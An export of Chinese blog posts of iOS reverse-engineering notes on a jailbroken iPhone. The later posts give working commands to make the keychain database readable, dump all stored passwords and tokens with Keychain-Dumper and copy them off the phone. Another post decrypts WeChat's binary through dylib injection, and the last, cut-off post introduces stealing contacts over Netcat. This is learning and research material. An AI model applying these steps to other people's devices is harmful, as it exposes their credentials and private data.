App的安装包格式一般是deb，StoreApp的安装包格式一般是ipa。其中deb是来自Debian的安装包格式，由Cydia作者saurik移植到iOS中，它的属主用户和属主组一般是root和admin，能够以root权限运行；而ipa是苹果为iOS推出的专属App安装包格式，属主用户和属主组都是mobile，只能以mobile权限运行。 沙盒（sandbox） 通俗地说，iOS中的沙盒就是一种访问限制机制，我们可以把它看作是权限的一种表现形式，授权文件（entitlements）也是沙盒的一部分。它是iOS最核心的安全组件之一，其实现很复杂，这里不过多讨论其细节。总的来说，沙盒会将App的文件访问范围限制在这个App内部，一个App一般不知道其他App的存在，更别说访问它们了；沙盒还会限制App的功能，例如对iCloud接口的调用就必须经过沙盒的允许。 在初学阶段，我们的目标不是沙盒，知道有这样一个东西存在就够了。在iOS逆向工程中，越狱本身已经破除了iOS的绝大多数安全限制，并对沙盒进行了一定程度的扩充，因此我们往往很容易忽略sandbox的存在，从而碰到一些看似很奇怪的问题。比如某个tweak不能写文件，调用了某个函数却没有出现应有的效果，在确保自己的代码没有问题的前提下，就要回过头来检查这些问题是不是因为权限不够，或者沙盒限制造成的。 Dynamic Library 大部分iOS开发者的日常工作应该都是写App，估计很少有人写过dylib，因此对dylib的概念很陌生。殊不知，在Xcode工程里导入的各种framework，链接的各种lib，其实本质都是dylib。可以用“file”命令验证一下，如下： 123file /Users/snakeninny/Code/iOSSystemBinaries/8.1.1_iPhone5/System/Library/Frameworks/UIKit.framework/UIKit/Users/snakeninny/Code/iOSSystemBinaries/8.1.1_iPhone5/System/Library/Frameworks/UIKit.framework/UIKit: Mach-O dynamically linked shared library arm 如果把焦点转移到越狱iOS中，Cydia里的各种tweak无一不是以dylib的形式工作的，正是这些tweak的存在让我们能够随意定制自己的iOS。在逆向工程中，我们会频繁接触各种dylib，因此有必要了解一些相关知识。 在iOS中，lib分为static和dynamic两种，其中staticlib在编译阶段成为App可执行文件的一部分，会增加可执行文件的大小。因为App尺寸变大，启动时需要加载的内容变多，所以可能会导致App启动变慢。dylib则相对“智能”一些，它不会改变可执行文件的大小，只有当App需要用到这个dylib时，iOS才会把它加载进内存，成为App进程的一部分。 值得一提的是，dylib虽然充斥在iOS的各个角落，是逆向工程的重要目标类型，但其本身并不是可执行文件，不能独立运行，只能为别的进程服务，而且它们寄生在别的进程里，成为了这个进程的一部分。因此，dylib的权限是由它寄生的那个App决定的，同一个dylib寄生在系统App和StoreApp里时的权限是不同的。例如，你写了一个Instagram的tweak，用来把喜欢的图片保存在本地，如果保存目录是/var/mobile/Containers/Data/下App对应的Documents目录，那么因为Instagram是一个StoreApp，这样的操作是没有问题的，tweak能够正常工作。而如果保存目录是/var/mobile/Documents，那么在兴高采烈地保存了一大堆美图，准备回头细细品味时，你就会发现/var/mobile/Documents里啥图片也没有——操作都被sandbox给禁掉了。 Daemon 相信绝大部分开发者从接触iOS开发的第一天起，就不断被苹果灌输这样一个观念——iOS中没有真正的后台多任务，你的App在后台将被大大限制。如果你是一个纯粹的App Store开发者，坚信并坚守这个观念，那么它将是你的App通过苹果审核的助推剂；但想要在学习逆向工程的同时了解一些官方文档没有阐述的事实，那么你就要保持冷静，理性思考。让我们一起回想一下iPhone上的一些现象。 当我们正在用iPhone上网或刷微博时来了一个电话，所有其他操作会立即中断，iOS第一时间将接听电话的界面呈现在我们面前。如果iOS中没有真正的后台多任务，系统是如何实时处理这个来电的呢？ 对于那些经常收到垃圾短信和骚扰电话的朋友来说，类似于SMSNinja这样的防火墙软件必不可少。如果它不能常驻iOS后台，怎么能够实时地处理并过滤收到的每一条短信呢？ Backgrounder是一款iOS 5时代的插件，它能够帮助App实现真正的后台运行。有了它，我们再也不用担心因为push功能的不给力而漏收QQ消息啦！ 如果iOS中没有真正的后台多任务，Backgrounder怎么会存在呢？ 这些现象无一不说明iOS实际上存在真正的后台多任务。那么难道是苹果说错了？并不是！对于StoreApp来说，当用户按下home键时，进程就进入后台了，大多数功能都会被暂停；也就是说，对于遵纪守法的App Store开发者来说，可以把iOS看作是没有真正后台多任务的系统，因为你唯一能干的事不支持后台多任务。但iOS源于OSX，后者又跟所有类UNIX操作系统一样，有daemon（即守护进程，Windows称Service）的概念。越狱开放了iOS全文件系统，daemon也得以展现在我们面前。 Daemon为后台运行而生，给用户提供了各种“守护”，如imagent保障了iMessage的正确收发，mediaserverd处理了几乎所有的音频、视频，syslogd则用于记录系统日志等。iOS中的daemon主要由一个可执行文件和一个plist文件构成。iOS的根进程是launchd，它会在开机时检查/System/Library/LaunchDaemons和/Library/LaunchDaemons下所有格式符合规定的plist文件，然后启动对应的daemon。这里的plist文件与App中的Info.plist文件作用类似，即记录daemon的基本信息，如下： 12345678910111213141516171819202122232425262728plutil -p/Users/snakeninny/Code/iOSSystemBinaries/8.1.1_iPhone5/System/Library/LaunchDaemons/com.apple.imagent.plist&#123; &quot;WorkingDirectory&quot; =&gt; &quot;/tmp&quot; &quot;Label&quot; =&gt; &quot;com.apple.imagent&quot; &quot;JetsamProperties&quot; =&gt; &#123; &quot;JetsamMemoryLimit&quot; =&gt; 3000 &#125; &quot;EnvironmentVariables&quot; =&gt; &#123; &quot;NSRunningFromLaunchd&quot; =&gt; &quot;1&quot; &#125; &quot;POSIXSpawnType&quot; =&gt; &quot;Interactive&quot; &quot;MachServices&quot; =&gt; &#123; &quot;com.apple.hsa-authentication-server&quot; =&gt; 1 &quot;com.apple.imagent.embedded.auth&quot; =&gt; 1 &quot;com.apple.incoming-call-filter-server&quot; =&gt; 1 &#125; &quot;UserName&quot; =&gt; &quot;mobile&quot; &quot;RunAtLoad&quot; =&gt; 1 &quot;ProgramArguments&quot; =&gt; [ 0 =&gt;&quot;/System/Library/PrivateFrameworks/IMCore.framework/imagent.app/imagent&quot; ] &quot;KeepAlive&quot; =&gt; &#123; &quot;SuccessfulExit&quot; =&gt; 0 &#125;&#125; 相对于App，daemon提供的功能要底层得多，逆向难度也要大得多，随意改动造成的后果当然也就严重得多，所以白苹果的惨案才会时有发生。在iOS逆向工程初学阶段，请不要把daemon当作练习目标；当你逆向了几个App，有了一定的心得和积累后再挑战这些daemon才是比较明智的选择。相比App，逆向daemon花费的时间和精力会更多，但更多的付出一定会带来更丰厚的回报。例如，“iOS上的第一款电话录音软件”Audio Recorder就是通过逆向mediaserverd这个daemon实现的。 总结 简单介绍了常见的二进制文件类型，它们都是App Store开发者不需要了解也接触不到的知识，在学习iOS逆向工程时很容易形成概念盲区。 本文旨在科普那些在逆向工程中非常重要但苹果官方闭口不提的iOS系统级知识点，从而为AppStore开发者打开iOS逆向工程的这扇窗。 参考 本文摘录整理自《iOS应用逆向工程(第2版)》一书, 以便学习查阅]]></content>
      <categories>
        <category>iOS</category>
        <category>逆向笔记</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>逆向笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS逆向笔记（一）：iOS目录结构 & 文件权限]]></title>
    <url>%2Farchives%2F971c1db6.html</url>
    <content type="text"><![CDATA[绝望是无限的美好。 ——王小波 《万寿寺》 简介 相较于iOS应用的高层表象，人们对其底层实现更感兴趣，这也是大家进行逆向工程的源动力。但是我们也都知道，未越狱的iOS是个封闭的黑盒子，直到evad3rs、盘古、太极等团队把iOS越狱之后，这个黑盒子才被打开，神秘的iOS得以完整地展现在我们面前。 iOS系统结构 对于未越狱的iOS，苹果官方开放给第三方直接访问iOS文件系统的接口非常有限，开发者只需要遵循规定，参考文档即可完成工作。因此，纯粹的AppStore开发者可能对iOS系统结构一无所知。 因为权限极低，来自App Store的普通App（以下简称StoreApp）不能访问自身目录以外的绝大多数文件。而iOS一旦越狱，来自Cydia的App就可以拥有比StoreApp更高的权限，从而访问全系统文件。 还可以在AFC2服务的帮助下，通过iFunBox等PC端软件访问iOS全系统文件 iOS目录结构简介 iOS是由OSX演化而来的，而OSX则是基于UNIX操作系统的。这三者虽然有很大区别，但它们血脉相连。从Filesystem Hierarchy Standard和hier(7)中，可以一窥iOS目录结构的设计标准。 Filesystem Hierarchy Standard（以下简称FHS）为类UNIX操作系统的文件目录结构制定了一套标准，它的初衷之一是让用户预知文件或目录的存放位置。OSX在此基础上形成了自己的hier(7)框架。 类UNIX操作系统的常见目录结构如下所示。 / ：根目录，以斜杠表示，其他所有文件和目录在根目录下展开。 /bin ：“binary”的简写，存放提供用户级基础功能的二进制文件，如ls、ps等。 /boot ：存放能使系统成功启动的所有文件。iOS中此目录为空。 /dev ：“device”的简写，存放BSD设备文件。每个文件代表系统的一个块设备或字符设备，一般来说，“块设备”以块为单位传输数据，如硬盘；而“字符设备”以字符为单位传输数据，如调制解调器。 /sbin ：“system binaries”的简写，存放提供系统级基础功能的二进制文件，如netstat、reboot等。 /etc ：“Et Cetera”的简写，存放系统脚本及配置文件，如passwd、hosts等。在iOS中，/etc是一个符号链接，实际指向/private/etc。 /lib ：存放系统库文件、内核模块及设备驱动等。iOS中此目录为空。 /mnt ：“mount”的简写，存放临时的文件系统挂载点。iOS中此目录为空。 /private ：存放两个目录，分别是/private/etc和/private/var。 /tmp ：临时目录。在iOS中，/tmp是一个符号链接，实际指向/private/var/tmp。 /usr ：包含了大多数用户工具和程序。/usr/bin包含那些/bin和/sbin中未出现的基础功能，如nm、killall等；/usr/include包含所有的标准C头文件；/usr/lib存放库文件。 /var ：“variable”的简写，存放一些经常更改的文件，比如日志、用户数据、临时文件等。其中/var/mobile和/var/root分别存放了mobile用户和root用户的文件，是重点关注的目录。 作为iOS开发者，日常操作所对应的功能模块大多来自iOS的独有目录 /Applications ：存放所有的系统App和来自于Cydia的App，不包括StoreApp /Developer ：如果一台设备连接Xcode后被指定为调试用机，Xcode就会在iOS中生成这个目录，其中会含有一些调试需要的工具和数据 /Library ：存放一些提供系统支持的数据。其中/Library/MobileSubstrate下存放了所有基于CydiaSubstrate（原名MobileSubstrate）的插件。 /System/Library ：iOS文件系统中最重要的目录之一，存放大量系统组件。 /System/Library/Frameworks和/System/Library/PrivateFrameworks：存放iOS中的各种framework，其中出现在SDK文档里的只是冰山一角，还有数不清的未公开功能等待我们去挖掘。 /System/Library/CoreServices里的SpringBoard.app：iOS桌面管理器（类似于Windows里的explorer），是用户与系统交流的最重要中介 /User ：用户目录，实际指向/var/mobile，这个目录里存放大量用户数据，比如： /var/mobile/Media/DCIM下存放照片； /var/mobile/Media/Recordings下存放录音文件； /var/mobile/Library/SMS下存放短信数据库； /var/mobile/Library/Mail下存放邮件数据。 注意 另外一个非常重要的子目录是/var/mobile/Containers，存放StoreApp。值得注意的是，App的可执行文件在bundle与App中的数据目录被分别存放在/var/mobile/Containers/Bundle和/var/mobile/Containers/Data这两个不同目录下。 iOS文件权限简介 iOS是一个多用户操作系统。“用户”是一个抽象的概念，它代表对操作系统的所有权和使用权。比如，mobile用户无法调用reboot命令重启iOS，而root用户却可以；“组”是用户的一种组织方式，一个组可以包含多个用户，一个用户也可以属于多个组。 iOS中的每个文件都有一个属主用户和一个属主组，或者说这个用户和这个组拥有这个文件；每个文件都具有一系列权限，简单地说，权限的作用在于说明文件的属主用户能做什么，属主组能做什么，以及其他所有人能做什么。iOS用3位（bit）来表示文件的权限，从高位到低位分别是r（read）权限、w（write）权限，以及x（execute）权限。文件与用户的关系存在以下三种可能性： 此用户是属主用户； 此用户不是属主用户，但在属主组里； 此用户既不是属主用户，又不在属主组里。 所以需要用3*3位来表示一个文件的权限，如果某一位为1，则这一位代表的权限生效，否则无效。例如，111101101代表rwxr-xr-x，即该文件的属主用户拥有r、w、x权限，而属主组和其他所有人只具有r和x权限；同时，二进制的111101101转换成十六进制是755，也是一种常见的权限表示法。 事实上，除r、w、x权限外，文件还可以拥有SUID、SGID和sticky等特殊权限，它们的应用频率不高，因此不占用单独的权限位，而是以简化形式出现在x权限所在的权限位中。 参考 本文摘录整理自《iOS应用逆向工程(第2版)》一书]]></content>
      <categories>
        <category>iOS</category>
        <category>逆向笔记</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>逆向笔记</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS攻防（五）：使用Keychain-Dumper导出keychain数据]]></title>
    <url>%2Farchives%2F65ed9c65.html</url>
    <content type="text"><![CDATA[生为冰山，就该淡淡地爱海流、爱风，并且在偶然接触时，全心全意地爱另一块冰山。 ——王小波 《似水柔情》 简介 根据苹果的介绍，iOS设备中的Keychain是一个安全的存储容器，可以用来为不同应用保存敏感信息比如用户名，密码，网络密码，认证令牌。苹果自己用keychain来保存Wi-Fi网络密码，VPN凭证等等。它是一个在所有app之外的sqlite数据库。 keychain可以说是系统里唯一可以做到安全可靠存储应用敏感数据并且可以在应用卸载或重新安装时仍然保留其数据的地方。当使用itunes进行数据备份时，每个应用程序在keychain里的数据都会得到备份,而且备份的数据是经过加密的。 鉴于keychain的这些特性，使得它成为开发者存储应用敏感数据的首选，应用程序常见的敏感数据通常有密码，秘钥等等。 但是，以上所讨论的安全仅限于手机不越狱为前提！！如果手机越狱我们可以使用Keychain-Dumper获取到KeyChain中的所有数据，不知道是算幸运还是不幸。 所有资料文件&amp;工具在这里 了解更多： iOS攻防（一）： iPhone手机越狱 &amp; SSH iOS攻防（二）：窃取用户的通讯录信息 &amp; 偷窥用户安装应用列表 &amp; Netcat使用 iOS攻防（三）：配置使用Reveal工具逆向别人的App UI界面 iOS攻防（四）：使用Dumpdecrypted 砸壳 &amp; class-dump 导出头文件 KeyChain数据库权限KeyChain数据库 所有存储在KeyChain中的数据，实际上是保存在一个keychain-2.db的数据库中。 该数据库位于/private/var/Keychains/目录下。 更改权限 默认情况下，我们是不能都读取keychain-2.db数据库的，所以需要先赋予其可读权限。 Terminal通过SSH登录手机 进入Keychains目录 给keychain-2.db数据库可读权限 123cd /private/var/Keychains/chmod +r keychain-2.db Keychain-Dumper下载安装Keychain-Dumper 下载Keychain-Dumper Keychain-Dumper的简单使用Keychain-Dumper可执行文件传输至手机 将下载的Keychain-Dumper文件夹内的keychain_dumper可执行文件传输至手机指定路径，如我放在手机/bin目录下 可以使用电脑助手，也可以使用指令操作如下： 123exit // 退出SSH连接手机scp ~/Desktop/Keychain-Dumper/keychain_dumper root@192.168.1.60:/bin/keychain_dumper 导出KeyChain数据 使用SSH连接手机，进入Root目录 可以直接执行上一步传输的可执行文件，会在终端直接输出dumper的KeyChain内容。 1./keychain_dumper 也可以执行上一步传输的可执行文件，并导出为txt文本方便查看 1/bin/keychain_dumper &gt; keychain-export.txt 将导出的文本文件，传输至电脑上查看, 可以使用电脑助手，也可以使用命令操作如下： 12cd /binscp root@192.168.1.60:keychain-export.txt ~/Desktop/keychain-export.txt 打开文本文件可以发现，我们的的KeyChain存储的数据在这里一览无遗，如果是敏感信息被别人破解，那么后果… 参考 iOS安全攻防（九）：使用Keychain-Dumper导出keychain数据 Keychain Dumper]]></content>
      <categories>
        <category>iOS</category>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS攻防（四）：使用Dumpdecrypted 砸壳 & class-dump 导出头文件]]></title>
    <url>%2Farchives%2F8c50aab9.html</url>
    <content type="text"><![CDATA[我向来不怕得罪朋友，因为既是朋友，就不怕得罪，不能得罪的就不是朋友，这是我的一贯作风。由这一点你也可猜出，我的朋友为什么这么少。 ——王小波《似水流年》 简介 class-dump是用来dump目标对象的头文件信息的工具。它利用Objective-C语言的runtime的特性，将存储在mach-O文件中的类/分类/协议等头文件信息提取出来并生产.h文件。 从AppStore下载的App是被苹果加密过的，可执行文件被套上了一层保护壳， 而class-dump无法作用于加密过的App。 在这种情况下，想要获取头文件，需要先解密App的可执行文件，俗称“砸壳”。 dumpdecrypted就是由越狱社区的知名人士Stefan Esser出品的一款砸壳工具，被广泛运用在iOS逆向工程研究中。 注意：如果不砸壳，直接使用class-dump现在已经无法dump出头文件的（之前可以dump出头文件但是是加密的），只会生成一个CDStructures.h文件. 所有资料文件&amp;工具在这里 了解更多： iOS攻防（一）： iPhone手机越狱 &amp; SSH iOS攻防（二）：窃取用户的通讯录信息 &amp; 偷窥用户安装应用列表 &amp; Netcat使用 iOS攻防（三）：配置使用Reveal工具逆向别人的App UI界面 class-dump下载安装class-dump 关于的class-dump详细安装方法，请点击这里 class-dump 可用于 查看闭源的应用、frameworks、bundles。 对比一个 APP 不同版本之间的接口变化。 对一些私有 frameworks 做些有趣的试验。 class-dump的简单使用dump出Mac版微信的头文件1class-dump -H /Applications/WeChat.app -o ~/Desktop/dump/WeChat-dump -H 要解析的文件 /Applications/WeChat.app 需要反编译的应用路径 -o 输出目录（后面跟路径） ~/Desktop/dump/WeChat-dump 头文件存放路径 也可以dump出系统库12class-dump /System/Library/Frameworks/AppKit.framework // AppKitclass-dump /Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS.sdk/System/Library/Frameworks/UIKit.framework // UIKit dumpMac版微信结果 执行完成后即可在指定输出目录查看dump的头文件信息 打开查看某个头文件的内容 dumpdecrypted 我们都知道Clutch是一个非常厉害的砸壳工具, 那么为什么还需要dumpdecrypted这个工具呢? 因为Clutch并不是万能的,无法砸开含有兼容WatchOs2的App, 从AppStore下载的有些App(比如WeChat)并不能使用Clutch来进行砸壳, 使用Clutch工具来进行砸壳会失败。 我的准备 MacOS 10.13.5 iPhone 5C 10.3.2 dumpdecrypted class-dump 在Cydia中安装 cycript, 可以先不用管 cycript 是什么, 后续会单独详讲. iTools或者其他助手工具 下载安装dumpdecrypted 去 Github 下载dumpdecrypted源码, 源码就一个C源文件. 下载后解压，文件如下： dumpdecryptedp编译 下载后打开Makefile文件，注意第三行： 1SDK=`xcrun --sdk iphoneos --show-sdk-path` 这里填写的SDK必须与你越狱的iPhone系统版本需要一致，你可以使用如下指令先查看你Xcode的SDK版本： 1/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS11.4.sdk 虽然我的Xcode的SDK版本是11.4，但是我查看了下支持的目录文件，是有10.3的支持文件的，所以可以直接编译，查看目录如下： 12// 进入Application内，Xcode右键显示包内容/Contents/Developer/Platforms/iPhoneOS.platform/DeviceSupport 打开终端，进入下载的dumpdecryptedp文件夹目录, 执行make即可完成编译, 操作步骤如图所示: 12345678910cd ~/Desktop/dumpdecryptedmake// 编译完输出信息如下`xcrun --sdk iphoneos --find gcc` -Os -Wimplicit -isysroot `xcrun --sdk iphoneos --show-sdk-path` -F`xcrun --sdk iphoneos --show-sdk-path`/System/Library/Frameworks -F`xcrun --sdk iphoneos --show-sdk-path`/System/Library/PrivateFrameworks -arch armv7 -arch armv7s -arch arm64 -c -o dumpdecrypted.o dumpdecrypted.c`xcrun --sdk iphoneos --find gcc` -Os -Wimplicit -isysroot `xcrun --sdk iphoneos --show-sdk-path` -F`xcrun --sdk iphoneos --show-sdk-path`/System/Library/Frameworks -F`xcrun --sdk iphoneos --show-sdk-path`/System/Library/PrivateFrameworks -arch armv7 -arch armv7s -arch arm64 -dynamiclib -o dumpdecrypted.dylib dumpdecrypted.old: warning: directory not found for option '-F/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS11.4.sdk/System/Library/PrivateFrameworks'ld: warning: directory not found for option '-F/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS11.4.sdk/System/Library/PrivateFrameworks'ld: warning: directory not found for option '-F/Applications/Xcode.app/Contents/Developer/Platforms/iPhoneOS.platform/Developer/SDKs/iPhoneOS11.4.sdk/System/Library/PrivateFrameworks' 编译成功后会在dumpdecryptedp文件目录下会生成dumpdecrypted.dylib和dumpdecrypted.o两个文件。 dumpecrypted.dylib 签名 如果不对该文件进行签名, 后续砸壳的操作会失败. 先找到已经在电脑上面安装的苹果开发者证书, 操作如下: 12## 列出可签名证书, 找到 mac 上面已经安装的证书security find-identity -v -p codesigning dumpecrypted.dylib签名, 命令如下: 1codesign --force --verify --verbose --sign "iPhone Developer: xxx xxxx (xxxxxxxxxx)" dumpdecrypted.dylib &quot;iPhone Developer: xxx xxxx (xxxxxxxxxx)&quot; 为上一步找到的你已经安装的开发者证书名称。 dumpdecryptedp的简单使用查找目标 App 所在进程 推荐先清空手机后台运行的所有程序 打开微信应用 通过电脑终端ssh登录iPhone手机，查看当前运行的所有的进程 1ps -e 会列出所有当前正在运行的进程，虽然我们杀掉了所有后台服务，但是会有很多的系统进程信息干扰，我们需要找到以WeChat结尾的进程，即是我们需要的微信进程 PID 是微信进程的进程ID CMD 是微信进程可执行文件的路径 WeChat.app 即是我们需要砸壳的目标app 12PID TTY TIME CMD771 ?? 0:06.94 /var/containers/Bundle/Application/6EE23DA1-6DE3-4477-A099-1E34639EB9C1/WeChat.app/WeChat 补充 查找可执行文件路径比较快的方法（如果知道可执行文件名称） 1find / -name WeChat.app 查找程序进程PID比较快的方法（如果知道可执行文件名称） 1ps aux | grep WeChat 查找目标app的Documents目录 砸壳需要将我们编译生成的dumpdecrypted.dylib文件放入目标app的Documents目录下，所以我们需要找到目标app的Documents目录。 终端进入手机的根目录执行下面指令, 我们会进入cy#模式： 771 是我们上一步查找到的微信的进程ID 1CoderBoy-iPhone:~ root# cycript -p 771 在cy#模式使用OC方法查找微信应用的Documents目录, 输入下面代码 1[[NSFileManager defaultManager] URLsForDirectory:NSDocumentDirectory inDomains:NSUserDomainMask][0] 成功后会输出微信应用的Documents目录路径，如下： 注意: 执行过程中, 在iPhone上面打开运行一下微信, 不然上面的执行一直卡在那里不动. 成功后输入ctrl＋d退出cycript 1#&quot;file:///var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documents/&quot; 砸壳 拷贝dumpdecrypted.dylib这个之前编译签名好的文件到iPhone上面该目标APP的Documents目录. 方法一：直接在电脑上通过助手软件将dumpdecrypted.dylib放入到目标app的Documents目录。 方法二：也可以使用指令将dumpdecrypted.dylib放入到目标app的Documents目录，操作如下： 在Mac上新建一个终端，如果当前是在手机root模式，也可以输入exit直接退出，输入如下指令： 1234// ~/Desktop/dumpdecrypted/dumpdecrypted.dylib 编译签名好的dumpdecrypted.dylib文件路径// /var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documents/ 上一步获取到的目标app的Documents目录scp ~/Desktop/dumpdecrypted/dumpdecrypted.dylib root@192.168.1.60:/var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documents/ 进入到手机Documents目录, 查看dumpdecrypted.dylib文件是否存在 12345ssh root@192.168.1.60cd /var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documentsls -l 开始砸壳，注意 DYLD_INSERT_LIBRARIES=后填写的是你刚刚传输到Documents目录的.dylib文件名，我的是 dumpdecrypted.dylib。 dumpdecrypted.dylib后的路径是需要砸壳的目标app的可执行文件路径，也即是之前查找目标app进程时获取到的路径，而不是Documents目录路径。 1YLD_INSERT_LIBRARIES=dumpdecrypted.dylib /var/containers/Bundle/Application/6EE23DA1-6DE3-4477-A099-1E34639EB9C1/WeChat.app/WeChat 砸壳成功后输入信息如下： 砸壳成功后会在Documents目录生成一个名为AppName.decrypted文件,如当前操作会生成一个WeChat.decrypted文件，可以使用ls -l指令查看。 123456789101112131415161718mach-o decryption dumperDISCLAIMER: This tool is only meant for security research purposes, not for application crackers.[+] detected 32bit ARM binary in memory.[+] offset to cryptid found: @0x59a4c(from 0x59000) = a4c[+] Found encrypted data at address 00004000 of length 54755328 bytes - type 1.[+] Opening /private/var/containers/Bundle/Application/6EE23DA1-6DE3-4477-A099-1E34639EB9C1/WeChat.app/WeChat for reading.[+] Reading header[+] Detecting header type[+] Executable is a plain MACH-O image[+] Opening WeChat.decrypted for writing.[+] Copying the not encrypted start of the file[+] Dumping the decrypted data into the file[+] Copying the not encrypted remainder of the file[+] Setting the LC_ENCRYPTION_INFO-&gt;cryptid to 0 at offset a4c[+] Closing original file[+] Closing dump file 使用Mac的助手工具直接将生成的WeChat.decrypted文件拷贝到桌面即可，也可使用终端指令拷贝，如下 退出手机Root模式，拷贝砸壳后文件到电脑桌面 123exitscp root@192.168.1.60:/var/mobile/Containers/Data/Application/8B12B9B9-06BE-49C2-ADC2-96BB1C4F5E79/Documents/WeChat.decrypted ~/Desktop/WeChat.decrypted class dump 砸壳后的文件 砸壳后的WeChat.decrypted文件就可以使用class-dump导出头文件，如下 --arch armv7是指定架构，dumpdecrypted只会砸你手机处理器对应的那个壳，fat binary的其它部分仍然是有壳的 而class-dump的默认目标又不是被砸壳的那个部分，如果不指定架构只能导出CDStructures.h一个文件 1class-dump --arch armv7 WeChat.decrypted -H -o /Users/sevencho/Desktop/dump/Wechat-decrypted-dump 现在就可以看到别人整个APP的.h文件信息了，除了可以优雅的学习大厂App的接口命名及设计规范外，当然还可以依靠强大的运行时特性做一些其他有意思的事情。]]></content>
      <categories>
        <category>iOS</category>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS攻防（三）：配置使用Reveal工具逆向别人的App UI界面]]></title>
    <url>%2Farchives%2F4de69069.html</url>
    <content type="text"><![CDATA[你生了气就哭,我一看见你哭就目瞪口呆,就像一个小孩子做了坏事在未受责备之前目瞪口呆一样,所以什么事你先别哭,先来责备我,好吗? ——王小波《爱你就像爱生命》 简介 工欲善其事，必先利其器 Reveal在逆向工程中不仅仅可以用来查看分析别人App的UI层次结构，还可以用来帮助我们在平时开发中快速定位问题。 对于初学者来说，去分析其他优秀App的界面实现，能够帮助快速提升开发能力。 我的环境配置： 越狱iPhone5c 10.3.2 Mac 10.13.5 并且安装有Reveal version 4(8796) 所有资料文件&amp;工具在这里 了解更多： iOS攻防（一）： iPhone手机越狱 &amp; SSH iOS攻防（二）：窃取用户的通讯录信息 &amp; 偷窥用户安装应用列表 &amp; Netcat使用 在越狱设备上配置RevealReveal Loader安装 首先在越狱设备的Cydia中输入搜索Reveal2Loader，并且进行安装即可。这一步比较简单，安装后重启SpringBoard即可。 注意安装最新的Reveal2Loader，兼容iOS8/9/10,如果越狱设备系统版本过低，请下载旧版本Reveal Loader安装即可。 导入libReveal.dylib 安装完成Reveal2Loader后查看在/Library/路径下下是否存在RHRevealLoader这个文件夹，并且查看该文件夹中是否有libReveal.dylib这个文件。 可以使用电脑端助手工具查看，也可以在终端查看 12345678// 连接手机ssh root@192.168.1.60 // 进入Library文件夹cd /Library // 查看Library文件夹下文件列表ls -r 文件夹存在 如果存在libReveal.dylib这个文件，则安装Reveal完成。 文件夹不存在 如果不存在libReveal.dylib这个文件，按如下步骤 手动创建RHRevealLoader这个文件夹，可以使用iTools或者Filza，也可以通过指令创建 1mkdir RHRevealLoader 在Mac电脑上打开Reveal，打开Reveal菜单 -&gt; Help -&gt; Show Reveal Library in Finder -&gt; iOS Library 注意：新版本的Reveal已经没有libReveal.dylib这个文件，只存在一个RevealServer.framework文件。 我们需要找到这个库文件下的RevealServer并复制一份到桌面，重命名为libReveal.dylib 将libReveal.dylib这个文件放入手机刚创建的/Library/RHRevealLoader/这个文件夹内。可以使用iTools，也可以通过指令上传 1scp /Users/sevencho/Desktop/libReveal.dylib root@192.168.1.60:/Library/RHRevealLoader/libReveal.dylib 至此,手机的Reveal安装配置完成。重启手机就可以愉快的和新认识的基友小伙伴一起玩耍了。 Reveal的使用在设备上选择想要Reveal的App 在越狱设备上安装完Reveal Loader后就可以在设置中找到Reveal的配置项，在该配置项中我们可以去选择要Reveal的App。 对于越狱手机，手机上安装的所有App都可以Reveal。当然也包括从AppStore下载的，也包括iOS系统自带的。如下所示： 查看App的UI层级 Mac上Reveal查看设备上App的UI层级时可以通过USB进行连接。 也可以使用wifi连接，但要保证你的iOS设备与你的Mac在同一个局域网内。]]></content>
      <categories>
        <category>iOS</category>
        <category>攻防</category>
      </categories>
      <tags>
        <tag>iOS</tag>
        <tag>攻防</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iOS攻防（二）：窃取用户的通讯录信息 & 偷窥用户安装应用列表 & Netcat使用]]></title>
    <url>%2Farchives%2Fbf5c1be0.html</url>
    <content type="text"><![CDATA[咱们应当在一起，否则就太伤天害理啦。 ——王小波《爱你就像爱生命》 简介 通过在iPhone上开启一个开机自启进程，读取用户手机通讯录数据库或者用户应用安装列表，写到标准输出。 开启一个Socket通信端口。 通过使用NetCat将iPhone手机的指定ip端口数据以文件格式传输到Mac桌面上。 所有资料文件&amp;工具在这里 了解更多： iOS攻防（一）： iPhone手机越狱 &amp; SSH 了解一下OS X的启动原理 Mac下的启动服务主要有三个地方可配置： 系统偏好设置-&gt;帐户-&gt;登陆项 /System/Library/StartupItems 和 /Library/StartupItems/ launchd 系统初始化进程配置。 launchd是Mac OS下，用于初始化系统环境的关键进程。类似Linux下的init, rc。 启动过程 mac固件激活，初始化硬件，加载BootX引导器。 BootX加载内核与内核扩展(kext)。 内核启动launchd进程。 launchd根据 /System/Library/LaunchAgents /System/Library/LaunchDaemons /Library/LaunchDaemons Library/LaunchAgents ~/Library/LaunchAgents里的plist配置，启动服务守护进程。 LaunchDaemons（后台驻留程序启动）是用户未登陆前就启动的服务(守护进程)LaunchAgents（启动代理）是用户登陆后启动的服务(守护进程) 理解几个基础概念：/System/Library和/Library和~/Library目录的区别？ /System/Library目录是存放Apple自己开发的软件。 /Library目录是系统管理员存放的第三方软件。 ~/Library/是用户自己存放的第三方软件。 几个目录下plist文件格式及每个字段的含义： 因为iOS和Mac都是基于Unix，所以启动过程基本是类似的。 Key Description Required Label The name of the job yes ProgramArguments Strings to pass to the program when it is executed yes UserName The job will be run as the given user, who may not 